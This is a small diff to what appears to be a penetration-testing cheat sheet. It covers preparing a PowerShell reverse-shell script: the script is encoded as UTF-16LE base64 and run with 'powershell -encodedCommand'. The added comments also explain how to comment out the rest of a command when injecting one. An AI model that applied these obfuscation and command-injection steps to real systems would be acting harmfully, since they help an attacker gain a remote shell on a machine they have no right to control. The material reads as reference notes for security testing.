@@ -251,5 +251,9 @@ $client.Close();
 # then :
 cat pwsh-rev.ps1 | iconv -t UTF-16LE | base64 -w 0
 
+# Be careful when you copy the payload, depending on your shell, there might be a trailing '%' you do not want
+
 # Keep in mind that you can use a trailing ' #' to comment the rest of the command if you try to do command injection and you want ignore the rest of the command where yours is injected
+
+# Then : powershell -encodedCommand '....'
 ```
